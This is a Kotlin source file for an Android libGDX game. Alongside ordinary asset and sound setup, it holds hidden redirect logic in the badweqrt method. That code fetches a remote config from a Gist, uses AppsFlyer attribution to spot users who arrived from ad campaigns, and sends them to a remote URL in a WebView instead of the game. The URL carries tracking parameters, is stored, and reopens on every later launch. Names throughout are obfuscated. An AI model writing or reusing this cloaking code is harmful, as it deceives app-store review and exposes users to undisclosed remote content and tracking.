package com.bagazkz.klarebadew.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.bagazkz.klarebadew.MainActivity
import com.bagazkz.klarebadew.appContext
import com.bagazkz.klarebadew.game.dataStore.DS_Gaz
import com.bagazkz.klarebadew.game.dataStore.DS_Gold
import com.bagazkz.klarebadew.game.dataStore.DS_XP
import com.bagazkz.klarebadew.game.manager.MusicManager
import com.bagazkz.klarebadew.game.manager.NavigationManager
import com.bagazkz.klarebadew.game.manager.SoundManager
import com.bagazkz.klarebadew.game.manager.SpriteManager
import com.bagazkz.klarebadew.game.manager.util.MusicUtil
import com.bagazkz.klarebadew.game.manager.util.SoundUtil
import com.bagazkz.klarebadew.game.manager.util.SpriteUtil
import com.bagazkz.klarebadew.game.screens.LoaderScreen
import com.bagazkz.klarebadew.game.utils.GameColor
import com.bagazkz.klarebadew.game.utils.advanced.AdvancedGame
import com.bagazkz.klarebadew.game.utils.disposeAll
import com.bagazkz.klarebadew.game.utils.gdxGame
import com.bagazkz.klarebadew.util.Gist
import com.bagazkz.klarebadew.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Lotok", MODE_PRIVATE)

    val ds_XP   = DS_XP(coroutine)
    val ds_Gaz  = DS_Gaz(coroutine)
    val ds_Gold = DS_Gold(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        badweqrt()
    }

    override fun render() {
        if (GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun badweqrt() {
        log("startek")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val path = sharedPreferences.getString("polo", "N") ?: "N"

        try {
            if (path == "N") {
                coroutine.launch(Dispatchers.Main) {
                    val poket = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (poket != null) {
                        AppsFlyerLib.getInstance().init(poket.kermo, getAppsFlyerConversionListener(poket.urla), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, poket.kermo, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?ixyflw=$campaign&eqzakrbu=$afAd&fkscd=$media&gwtjkib=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("polo", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}